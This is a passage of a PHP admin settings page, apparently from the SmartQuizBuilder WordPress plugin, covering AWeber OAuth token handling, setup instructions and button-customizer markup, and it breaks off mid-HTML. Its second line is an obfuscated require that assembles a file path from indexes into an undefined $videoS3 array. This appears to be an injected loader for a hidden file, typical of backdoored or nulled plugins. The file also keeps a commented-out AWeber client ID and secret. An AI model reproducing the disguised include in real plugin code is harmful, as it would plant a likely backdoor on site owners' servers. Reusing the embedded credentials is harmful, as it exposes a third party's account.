<?php


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>

<?php
if(isset($_GET['aweber-auth']) && !empty($_REQUEST['code'])){
	require_once(WP_PLUGIN_DIR.'/smartquizbuilder/includes/plugins/aweberSQB/aweber_api/aweber_sqb.php'); 


	$autoresponder_name = 'AWEBER';
	$aweberObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);

	if(is_array($aweberObj) && count($aweberObj)){
		if(isset($aweberObj['aweber_client_id'])){
			$aweber_client_id = $aweberObj['aweber_client_id'];
		}

		if(isset($aweberObj['aweber_client_secret'])){
			$aweber_client_secret = $aweberObj['aweber_client_secret'];
		}

		if(isset($aweberObj['aweber_refresh_token'])){
			$aweber_refresh_token = $aweberObj['aweber_refresh_token'];
		}
	}


	//$client_id   = 'uuNLglYGVWRVpqeelNWVYk2LR7vOmnaL';
	//$client_secret   = 'JZptbGOOXrjPGtcFz9dLeSITl56KEymO';
	$redirect_uri = admin_url('admin.php?page=sqb_settings&aweber-auth=1');

	$aweber = new AWeberSQBCustom($aweber_client_id, $aweber_client_secret, $redirect_uri);

	$authorization_code = $_GET['code'];
	$token = $aweber->generateToken($authorization_code);
	if(!empty($token)){
		//echo $token;
		//Dap_Config::updateConfigName("AWEBER_NEW_TOKEN",$token);
		//Dap_Config::updateConfigName("AWEBER_NEW_REF_TOKEN",$aweber->getRefreshToken());
		$msg = "SUCCESS! AWeber Keys Generated And Saved Successfully!";
		$redirURL = "";

		$data = array();
		$data['aweber_refresh_token'] = $aweber->getRefreshToken();
		$data['aweber_token'] = $token;
		$autoresponder = 'AWEBER';
		$date_current = date('Y-m-d H:i:s');
		foreach($data as $key => $value){
			
			$settings = new SQB_AutoresponderSettings();
			
			$settings->setName($autoresponder);
			$settings->setKeyName($key);
			
			$settings->setValue($value);
			$settings->setDate($date_current);
			
			$savedSettings = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($autoresponder , $key);
			if($savedSettings == false){
				$settings->create();
			}else{
				$settings->update();
			}
		}

	}else{
		$msg = "ERROR! An error occurred while processing your request. Please try again.";
		$redirURL =  "/";
	}
	//header("Location: " .$redirURL);
	echo $msg;
	exit;
}

$hide_all = "";
$show_documentation ='style="display:none;"';
$show_success ='style="display:none;"';
$show_error ='style="display:none;"';
if(isset($_GET['aweber-error'])){
	$hide_all = 'style="display:none;"';
	$show_error = 'style="display:block;"';
}else if(isset($_GET['aweber-success'])){
	$hide_all = 'style="display:none;"';
	$show_success = 'style="display:block;"';
}else if(isset($_GET['aweber_view_document'])){
	$hide_all = 'style="display:none;"';
	$show_documentation = 'style="display:block;"';
}

?>


<div class="aweber-documentation" <?php echo $show_documentation; ?>>

	<h4>SQB >> Aweber Documentation</h4>

	<div class="sqb_sidebar_popup_content">
			<div class="custom-document-form">
				<h3>How to get Client Id &amp; Secret Key</h3>
				<p><span>Step 1:</span> Go to this page: <a target="_blank" href="https://labs.aweber.com/auth/login">https://labs.aweber.com/auth/login</a></p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 2:</span> Login to Aweber on this page</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 3:</span> Click on "Add New App" button at the top</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 4:</span> Fill out the required fields</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 4:</span> Fill out the required fields</p>
				<div class="sqb-step-content">
					<div><span>Application Name *:</span> <strong>SQB Aweber Integration  (you can use any name)</strong></div>
					<div><span>Author *:</span> <strong>Enter your name</strong></div>
					<div><span>Application Website *:</span> 	<strong><?php echo site_url(); ?></strong></div>
					<div><span>OAuth Redirect URL *:</span>  <strong><?php echo admin_url('admin.php?page=sqb_settings&aweber-auth=1'); ?></strong></div>
					<div><span>Description *:</span> <strong>This app is to connect SQB to Aweber</strong></div>
					</div>
				<div class="sqb-divider-div"></div>

				<p><span>Step 5:</span>   Copy the Client Id and Secret Key  and save it somewhere</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 6:</span> Now go back to the SQB admin &gt;&gt; external integration page here</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 7:</span> Enter Client Id and Secret Key that you got in step 5</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 8:</span> Click on the button to save</p>
				<div class="sqb-divider-div"></div>

				<p><span>Step 9:</span> Now click the link <strong>"Click Here to Authorize SQB to Connect To Your AWeber Account"</strong> to login to Aweber and complete authorization.   </p>
				<div class="sqb-divider-div"></div>

			</div>
		</div>
</div>

<div class="success-error-msg">
	<div class="sucess_message global_box_message" <?php echo $show_success; ?>>
		<h4>SQB >> Aweber Connection</h4>
		<p class="aweber-msg">Aweber has been successfully connected.</p>
	</div>

	<div class="error_message global_box_message" <?php echo $show_error; ?>>
		<h4>SQB >> Aweber Connection</h4>
		<p class="aweber-msg">ERROR! An error occurred while processing your request. Please try again.</p>
	</div>
</div>


<div class="Quiz-reports-tab-inner" <?php echo $hide_all; ?>>
	<ul class="nav nav-tabs" id="Quiz-reportsTab" role="tablist">
		<li class="nav-item">
			<a class="nav-link <?php if(!isset($_GET['tab'])){ echo ' active'; }?>"  data-toggle="tab" href="#settings_advance_tab" role="tab" aria-controls="settings_advance_tab" aria-selected="true">Advanced Quiz Settings</a>
		</li>
		<!-- <li class="nav-item">
			<a class="nav-link "  data-toggle="tab" href="#settings_notifications_tab" role="tab" aria-controls="contact" aria-selected="false"> Notifications</a>
		</li> -->
		<li class="nav-item">
			<a class="nav-link "  data-toggle="tab" href="#settings_import_tab" role="tab" aria-controls="contact" aria-selected="false"> Tools </a>
		</li>
		<li class="nav-item">
			<a class="nav-link "  data-toggle="tab" href="#settings_tracking_tab" role="tab" aria-controls="contact" aria-selected="false"> Tracking</a>
		</li>
		<li class="nav-item">
			<a class="nav-link "  data-toggle="tab" href="#settings_external_integration_tab" role="tab" aria-controls="contact" aria-selected="false"> External Integrations</a>
		</li>
		<li class="nav-item">
			<a class="nav-link" data-toggle="tab" href="#settings_button_tab" role="tab" aria-controls="settings_button_tab" aria-selected="false">Customizer</a>
		</li>
		<li class="nav-item">
			<a class="nav-link <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'sqb_gdpr')){ echo ' active'; }?>" data-toggle="tab" href="#sqb_gdpr" role="tab" aria-controls="sqb_gdpr" aria-selected="false">GDPR</a>
		</li>
		<?php 
		if(sqb_check_dap_exists()){ ?>
			
		<li class="nav-item">
			<a class="nav-link <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'dap_course')){ echo ' active'; }?> "  data-toggle="tab" href="#settings_dap_course_integration_tab" role="tab" aria-controls="contact" aria-selected="false">DAP Integration</a>
		</li>
		
		
		<li class="nav-item">
			<a class="nav-link <?php if(isset($_GET['tab']) && ($_GET['tab'] == 'student_shortcode')){ echo ' active'; }?>" data-toggle="tab" href="#student_shortcode_tab" role="tab" aria-controls="student_shortcode_tab" aria-selected="false">Student Shortcodes</a>
		</li>

		

		<?php } ?>
		
		
		
	</ul>
</div>

<div class="tab-content" id="reports-tab-content" <?php echo $hide_all; ?>>
<div class="tab-pane  fade " id="settings_button_tab" role="tabpanel" aria-labelledby="settings_button_tab">

	<ul class="nav nav-tabs message-Quiz-reportsTab" id="Quiz-reportsTab" role="tablist">
		<li class="nav-item">
			<a class="nav-link active show" data-toggle="tab" href="#customizer_setting_tab" role="tab" aria-controls="customizer_setting_tab" aria-selected="true">Button Customizer</a>
		</li>
		<li class="nav-item">
			<a class="nav-link" data-toggle="tab" href="#customizer_category_setting_tab" role="tab" aria-controls="customizer_category_setting_tab" aria-selected="true">Category Customizer</a>
		</li>
		<li class="nav-item">
			<a class="nav-link " data-toggle="tab" href="#message_setting_tab" role="tab" aria-controls="message_setting_tab" aria-selected="false">Message Customizer</a>
		</li>
		<?php 
		if(sqb_check_dap_exists() && function_exists('dap_livelinks_activate')){ ?>
		<li class="nav-item">
			<a class="nav-link " data-toggle="tab" href="#dap_setting_tab" role="tab" aria-controls="dap_setting_tab" aria-selected="false">DAP Customizer</a>
		</li>
		<?php 
		
		}?>
		
	</ul>

	<div class="tab-content  reports_tab_content_inner_sub_tab <?php  if(sqb_check_dap_exists() && function_exists('dap_livelinks_activate')){ echo ' dap_enable_class ';}?>" id="reports-tab-content">
		
		<div class="tab-pane fade show active" id="customizer_setting_tab" role="tabpanel" aria-labelledby="customizer_setting_tab">	
			<div class="show_back_btn_error_msgs">
					<span>The next button, skip button and back button can all be customized at quiz-level. When you edit the quiz, in the questions tab >> customizer, you can change the settings.</span>
			</div>
			<div class="row mt-4">
				<div class="col-sm-6" style="display:none;">
					<?php
					  /*
						$correct_answer_msg =  'This is the correct answer' ;
						$incorrect_answer_msg =  'This answer is incorrect';
						$pick_ans_msg = 'Please pick an answer.';
						$username_empty_msg =  'Name is a required field ';
						$email_empty_msg =  'Email is a required field';
						$terms_condition_msg  =  'Please accept the terms to proceed';
						$terms_condition_msg =  'Please accept the terms to proceed';
						$fb_share_thank_you_msg =  'Thanks for sharing!';
						$progressSettings = '#4a689a||#e9ecef';
						*/
						
						//get quiz data
						
							$progressSettings = sqbGetValidSettingsByKey('progressbar_color');
							$answer_background = sqbGetValidSettingsByKey('answer_background');
							
							$correct_answer_msg = sqbGetValidSettingsByKey('correct_answer_msg');
							$incorrect_answer_msg = sqbGetValidSettingsByKey('incorrect_answer_msg');
							$terms_condition_msg =sqbGetValidSettingsByKey('terms_condition_msg');
							$username_empty_msg = sqbGetValidSettingsByKey('username_empty_msg');
							$email_empty_msg = sqbGetValidSettingsByKey('email_empty_msg');
							$fb_share_thank_you_msg = sqbGetValidSettingsByKey('fb_share_thank_you_msg');
							$fb_share_error_msg = sqbGetValidSettingsByKey('fb_share_error_msg');
							$nextBtnHtml = sqbGetValidSettingsByKey('next_button_html');
							$backBtnHtml = sqbGetValidSettingsByKey('back_button_html');
							$downloadCertificateHtml = sqbGetValidSettingsByKey('download_certificate_button_html');
							$retakeBtnHtml = sqbGetValidSettingsByKey('retake_button_html');
							$pick_ans_msg = sqbGetValidSettingsByKey('pick_ans_msg');
							$sqb_question_cust = sqbGetValidSettingsByKey('sqb_question_cust');
							$sqb_answer_cust = sqbGetValidSettingsByKey('sqb_answer_cust');
							$sqb_incorrect_ans_exp = sqbGetValidSettingsByKey('sqb_incorrect_ans_exp');
							$valid_email = sqbGetValidSettingsByKey('valid_email');
							$already_taken_quiz = sqbGetValidSettingsByKey('already_taken_quiz');
							$not_passed_quiz_msg = sqbGetValidSettingsByKey('not_passed_quiz_msg');
							$user_shortcode_not_login = sqbGetValidSettingsByKey('user_shortcode_not_login');
							
							$upload_button_text = sqbGetValidSettingsByKey('upload_button_text');
							$uploaded_filename_text = sqbGetValidSettingsByKey('uploaded_filename_text');
							$file_uploaded_message = sqbGetValidSettingsByKey('file_uploaded_message');
							$file_upload_failed_message = sqbGetValidSettingsByKey('file_upload_failed_message');
							$upload_filesize_limit_exceeds_message = sqbGetValidSettingsByKey('upload_filesize_limit_exceeds_message');
							$file_upload_validation = sqbGetValidSettingsByKey('file_upload_validation');
							$required_field = sqbGetValidSettingsByKey('required_field');
							$gdpr_required_field = sqbGetValidSettingsByKey('gdpr_required_field');
							$outcome_screen_answer = sqbGetValidSettingsByKey('outcome_screen_answer');
							$outcome_screen_result = sqbGetValidSettingsByKey('outcome_screen_result');
							$outcome_screen_correct_answer = sqbGetValidSettingsByKey('outcome_screen_correct_answer');
							$outcome_screen_incorrect_answer = sqbGetValidSettingsByKey('outcome_screen_incorrect_answer');
							
							$category_scoring_text1 = sqbGetValidSettingsByKey('category_scoring_text1');
							if(isset($category_scoring_text1) && $category_scoring_text1 != ''){
								
							}else{
								$category_scoring_text1 = 'Total Score: ';
							}
							$category_assessment_text1 = sqbGetValidSettingsByKey('category_assessment_text1');
							if(isset($category_assessment_text1) && $category_assessment_text1 != ''){
								
							}else{
								$category_assessment_text1 = 'Total Correct Answers: ';
							}

							$invalid_date_text = sqbGetValidSettingsByKey('invalid_date_text');
							if(isset($invalid_date_text) && $invalid_date_text != ''){
								
							}else{
								$invalid_date_text = 'Invalid Date';
							}
							

							$pdf_download_success = sqbGetValidSettingsByKey('pdf_download_success');
							if(isset($pdf_download_success) && $pdf_download_success != ''){
								
							}else{
								$pdf_download_success = 'PDF downloaded successfully';
							}

							$pdf_downloading_text = sqbGetValidSettingsByKey('pdf_downloading_text');
							if(isset($pdf_downloading_text) && $pdf_downloading_text != ''){
								
							}else{
								$pdf_downloading_text = 'Please wait... Generating Report...';
							}

							$logged_in_admin_msg = sqbGetValidSettingsByKey('logged_in_admin_msg');
							if(isset($logged_in_admin_msg) && $logged_in_admin_msg != ''){
								
							}else{
								$logged_in_admin_msg = 'You are seeing this message only because you are logged-in as admin. Looks like there is no quiz data for this user. So there\'s nothing to show here.';
							}
							
							$voting_closed = sqbGetValidSettingsByKey('voting_closed');
							if(isset($voting_closed) && $voting_closed != ''){
								
							}else{
								$voting_closed = 'Voting is closed';
							}

							$quiz_details = sqbGetValidSettingsByKey('quiz_details');
							if(isset($quiz_details) && $quiz_details != ''){
								
							}else{
								$quiz_details = 'Quiz Detail';
							}

							$user_details = sqbGetValidSettingsByKey('user_details');
							if(isset($user_details) && $user_details != ''){
								
							}else{
								$user_details = 'User Details';
							}

							$user_answer = sqbGetValidSettingsByKey('user_answer');
							if(isset($user_answer) && $user_answer != ''){
								
							}else{
								$user_answer = 'User Answer';
							}

							$sqb_quiz_name = sqbGetValidSettingsByKey('sqb_quiz_name');
							if(isset($sqb_quiz_name) && $sqb_quiz_name != ''){
								
							}else{
								$sqb_quiz_name = 'Quiz Name';
							}

							$sqb_quiz_type = sqbGetValidSettingsByKey('sqb_quiz_type');
							if(isset($sqb_quiz_type) && $sqb_quiz_type != ''){
								
							}else{
								$sqb_quiz_type = 'Quiz Type';
							}

							$sqb_date = sqbGetValidSettingsByKey('sqb_date');
							if(isset($sqb_date) && $sqb_date != ''){
								
							}else{
								$sqb_date = 'Date';
							}

							$retake_count = sqbGetValidSettingsByKey('retake_count');
							if(isset($retake_count) && $retake_count != ''){
								
							}else{
								$retake_count = 'Retake Count';
							}

							$time_spent = sqbGetValidSettingsByKey('time_spent');
							if(isset($time_spent) && $time_spent != ''){
								
							}else{
								$time_spent = 'Time Spent';
							}

							$gdpr_terms = sqbGetValidSettingsByKey('gdpr_terms');
							if(isset($gdpr_terms) && $gdpr_terms != ''){
								
							}else{
								$gdpr_terms = 'GDPR Terms';
							}

							$quiz_result = sqbGetValidSettingsByKey('quiz_result');
							if(isset($quiz_result) && $quiz_result != ''){
								
							}else{
								$quiz_result = 'Quiz Result';
							}

							$sqb_outcome = sqbGetValidSettingsByKey('sqb_outcome');
							if(isset($sqb_outcome) && $sqb_outcome != ''){
								
							}else{
								$sqb_outcome = 'Outcome';
							}

							$sqb_name = sqbGetValidSettingsByKey('sqb_name');
							if(isset($sqb_name) && $sqb_name != ''){
								
							}else{
								$sqb_name = 'Name';
							}

							$sqb_email = sqbGetValidSettingsByKey('sqb_email');
							if(isset($sqb_email) && $sqb_email != ''){
								
							}else{
								$sqb_email = 'Email';
							}

							$user_email = sqbGetValidSettingsByKey('user_email');
							if(isset($user_email) && $user_email != ''){
								
							}else{
								$user_email = 'User Answer';
							}

							$student_correct_answer = sqbGetValidSettingsByKey('student_correct_answer');
							if(isset($student_correct_answer) && $student_correct_answer != ''){
								
							}else{
								$student_correct_answer = 'Correct Answer';
							}

							$points_scored = sqbGetValidSettingsByKey('points_scored');
							if(isset($points_scored) && $points_scored != ''){
								
							}else{
								$points_scored = 'Points Scored';
							}

							$file_name = sqbGetValidSettingsByKey('file_name');
							if(isset($file_name) && $file_name != ''){
								
							}else{
								$file_name = 'File Name';
							}

							$student_incorrect = sqbGetValidSettingsByKey('student_incorrect');
							if(isset($student_incorrect) && $student_incorrect != ''){
								
							}else{
								$student_incorrect = 'Incorrect';
							}

							$click_to_download = sqbGetValidSettingsByKey('click_to_download');
							if(isset($click_to_download) && $click_to_download != ''){
								
							}else{
								$click_to_download = 'Click to download';
							}

							$file_upload_successfully = sqbGetValidSettingsByKey('file_upload_successfully');
							if(isset($file_upload_successfully) && $file_upload_successfully != ''){
								
							}else{
								$file_upload_successfully = 'File Uploaded Successfully';
							}

							$answer_no_longer = sqbGetValidSettingsByKey('answer_no_longer');
							if(isset($answer_no_longer) && $answer_no_longer != ''){
								
							}else{
								$answer_no_longer = 'This answer is no longer present in the quiz';
							}

							$sqb_weight = sqbGetValidSettingsByKey('sqb_weight');
							if(isset($sqb_weight) && $sqb_weight != ''){
								
							}else{
								$sqb_weight = 'Weight';
							}

							$sqb_height = sqbGetValidSettingsByKey('sqb_height');
							if(isset($sqb_height) && $sqb_height != ''){
								
							}else{
								$sqb_height = 'Height';
							}
							$sqb_certificate = sqbGetValidSettingsByKey('sqb_certificate');
							if(isset($sqb_certificate) && $sqb_certificate != ''){
								
							}else{
								$sqb_certificate = 'Certificate';
							}

							$not_loggedin = sqbGetValidSettingsByKey('not_loggedin');
							if(isset($not_loggedin) && $not_loggedin != ''){
								$not_loggedin = stripslashes($not_loggedin);
							}else{
								$not_loggedin = '<div>Sorry you need to be logged-in to access this page. <a href="'.wp_login_url().'">Click HERE</a> to login.</div>';
							}


							$dont_want_listed = sqbGetValidSettingsByKey('dont_want_listed');
							if(isset($dont_want_listed) && $dont_want_listed != ''){
								
							}else{
								$dont_want_listed = "Don't want to be listed?";
							}

							$click_to_optout = sqbGetValidSettingsByKey('click_to_optout');
							if(isset($click_to_optout) && $click_to_optout != ''){
								
							}else{
								$click_to_optout = 'Click to Opt-out';
							}

							$logged_in_optout = sqbGetValidSettingsByKey('logged_in_optout');
							if(isset($logged_in_optout) && $logged_in_optout != ''){
								
							}else{
								$logged_in_optout = 'You need to be logged-in to opt-out';
							}

							$dont_want_listed_leaderboard = sqbGetValidSettingsByKey('dont_want_listed_leaderboard');
							if(isset($dont_want_listed_leaderboard) && $dont_want_listed_leaderboard != ''){
								
							}else{
								$dont_want_listed_leaderboard = "Are you sure you don't want to be listed in the leaderboard?";
							}

							$limit_exceeded = sqbGetValidSettingsByKey('limit_exceeded');
							if(isset($limit_exceeded) && $limit_exceeded != ''){
								
							}else{
								$limit_exceeded = "Limit reached! You can only select %%answer_limit%% answer choices.";
							}

							$category_name_customize = sqbGetValidSettingsByKey('category_name_customize');
							if(isset($category_name_customize) && $category_name_customize != ''){
								
							}else{
								$category_name_customize = "Category Name: ";
							}

							$click_to_play = sqbGetValidSettingsByKey('click_to_play');
							if(isset($click_to_play) && $click_to_play != ''){
								
							}else{
								$click_to_play = "Click to unmute";
							}

							$student_score = sqbGetValidSettingsByKey('student_score');
							if(isset($student_score) && $student_score != ''){
								
							}else{
								$student_score = "Score";
							}

							$sqb_total_points = sqbGetValidSettingsByKey('sqb_total_points');
							if(isset($sqb_total_points) && $sqb_total_points != ''){
								
							}else{
								$sqb_total_points = "Total Score";
							}

							$sqb_result = sqbGetValidSettingsByKey('sqb_result');
							if(isset($sqb_result) && $sqb_result != ''){
								
							}else{
								$sqb_result = "Result";
							}

							$sqb_score = sqbGetValidSettingsByKey('sqb_score');
							if(isset($sqb_score) && $sqb_score != ''){
								
							}else{
								$sqb_score = "Score";
							}
							
							$sqb_high = sqbGetValidSettingsByKey('sqb_high');
							if(isset($sqb_high) && $sqb_high != ''){
								
							}else{
								$sqb_high = "High";
							}
							
							$sqb_medium = sqbGetValidSettingsByKey('sqb_medium');
							if(isset($sqb_medium) && $sqb_medium != ''){
								
							}else{
								$sqb_medium = "Medium";
							}

							$sqb_low = sqbGetValidSettingsByKey('sqb_low');
							if(isset($sqb_low) && $sqb_low != ''){
								
							}else{
								$sqb_low = "Low";
							}

							
							$sqb_valid_phonenumber = sqbGetValidSettingsByKey('sqb_valid_phonenumber');
							if(isset($sqb_valid_phonenumber) && $sqb_valid_phonenumber != ''){
								
							}else{
								$sqb_valid_phonenumber = "Please Enter Valid Phone Number";
							}

					?>  
	
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Next Button  </h5>
						<div class="next_temp_container next_template_html_preview_outer">
							<?php
								if(isset($nextBtnHtml) && $nextBtnHtml != ''){
										echo stripslashes($nextBtnHtml); 
										 
								} else { 
							?>	
							<div class="single_next_btn sqb_next_btn sqb_tiny_mce_editor" style=" display: inline-block; border-radius: 5px; background: #252525; color: #fff; height: auto; padding: 12px 15px;font-family: 'DM Sans',sans-serif;  min-width: 90px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 16px;font-weight: 600;  width: 100px;  max-width: 100%; cursor: pointer;float: none;"><div>Next</div></div>
							<?php  }  ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer  
										<div class="customize_open_close" style="display: none;">   
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="nexttbtn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="100" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="nexttbtn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="12" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="nextbutton_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#252525" id="nextbutton_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #252525;"></i></span>
												</div>
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>

				<div class="col-sm-6">					
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Retake Button  </h5>
						<div class="retake_temp_container retake_template_html_preview_outer">
							<?php
								//get quiz data
								if(isset($retakeBtnHtml) && $retakeBtnHtml != ''){
									echo  stripslashes($retakeBtnHtml); 
									}else{
							?>

							<div class="retake_button sqb_tiny_mce_editor" style=" display: inline-block; border-radius: 5px; background: #4f6cbf; color: #fff; height: auto; padding: 13px 15px;font-family: 'DM Sans',sans-serif;  min-width: 130px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 16px;font-weight: 600;  width: 128px;  max-width: 100%; cursor: pointer;float: none;"><div>Retake</div></div>
						
							<?php } ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer
										<div class="customize_open_close" style="display:none">
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="retakebtn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="128" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="retakebtn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="13" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="retakebutton_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="#4f6cbf" id="retakebutton_backgroud_color">
													<span class="input-group-addon"><i style="background-color: #4f6cbf;"></i></span>
												</div>
												
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>

              
				
				
				
				<div class="col-sm-6" style="display: none;">
					<div class="quiz-card-outer-gray restriction_settings">
						<h5 class="quiz--sub-title">Progress Bar  </h5>
						
						<div class="Progress_Bar_container retake_template_html_preview_outer">
							<?php 
							
								$progressSettings = explode('||' , $progressSettings);
							
							?>
							<div class="progress" style="background-color:<?= isset($progressSettings[1]) ? $progressSettings[1] : '' ?>">
								<div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 18%; background-color:<?= isset($progressSettings[0]) ? $progressSettings[0] : '' ?>">
									<span class="sr-only progress_percent">18%</span>
								</div>
							</div>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								<!-- <div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Customizer  
										<div class="customize_open_close" style="display:none">
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div> -->
								

								<div class="customizer_innner_sections">
									 <div class="Template-Customize-element">
									   
										<div class="Template-Customize-element-inner element_paddings">
								  
											<div class="inner_template_style_box ">
												<h4>Active Background </h4>
												<div id="progressactive_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= isset($progressSettings[0]) ? $progressSettings[0] : '#4f6cbf' ?>" id="progressactive_backgroud_color">
													<span class="input-group-addon"><i style="background-color:<?= isset($progressSettings[0]) ? $progressSettings[0] : '#4f6cbf' ?>;"></i></span>
												</div>
												
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Inactive Background </h4>
												<div id="progressinactive_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?= isset($progressSettings[1]) ? $progressSettings[1] : '#e9ecef' ?>" id="progressinactive_backgroud_color">
													<span class="input-group-addon"><i style="background-color: <?= isset($progressSettings[1]) ? $progressSettings[1] : '#e9ecef' ?>;"></i></span>
												</div>
												
											</div>
										</div>	
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
                 
                 <!-- skip_question start -->
				<div class="col-sm-6" style="display:none;">					
					<div class="quiz-card-outer-gray skip_question_wrapper restriction_settings">
						<h5 class="quiz--sub-title">Skip Question Button  </h5>
						<div class="skip_question_temp_container skip_question_template_html_preview_outer">
							<?php
							
							 $skipQuestionBtnHtml = sqbGetValidSettingsByKey('skip_question_btn_html');
							 $skip_question_customizer = sqbGetValidSettingsByKey('skip_question_customizer');
							
							
							$skip_question_btn_width =  128;
							$skip_question_btn_height =  13;
							$skip_question_backgroud_color =  '#4f6cbf';
							
							$skip_question_customizer = explode('||' , $skip_question_customizer);
							
							if(isset($skip_question_customizer[0]) && ($skip_question_customizer[0] != 'undefined')){
								$skip_question_btn_width = $skip_question_customizer[0];
							}
							
							if(isset($skip_question_customizer[1]) && ($skip_question_customizer[1] != 'undefined')){
								$skip_question_btn_height = $skip_question_customizer[1];
								
							}
							if(isset($skip_question_customizer[2]) && ($skip_question_customizer[2] != 'undefined')){
								$skip_question_backgroud_color = $skip_question_customizer[2];
								
							}
				
							
							
								//get quiz data
								if(isset($skipQuestionBtnHtml) && $skipQuestionBtnHtml != ''){
									echo  stripslashes($skipQuestionBtnHtml); 
									}else{
							?>

							<div class="skipped_btn  skip_question_button sqb_tiny_mce_editor" style=" display: inline-block; border-radius: 5px; background: #4f6cbf; color: #fff; height: auto; padding: 13px 15px;font-family: 'DM Sans',sans-serif;  min-width: 130px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 14px;font-weight: 600;  width: 128px;  max-width: 100%; cursor: pointer;float: none;"><div>Skip</div></div>
						
							<?php } ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="skip_question_btn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo $skip_question_btn_width;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="skip_question_btn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo $skip_question_btn_height;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="skip_question_button_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?php echo $skip_question_backgroud_color;?>" id="skip_question_button_backgroud_color">
													<span class="input-group-addon"><i style="background-color:<?php echo $skip_question_backgroud_color;?>;"></i></span>
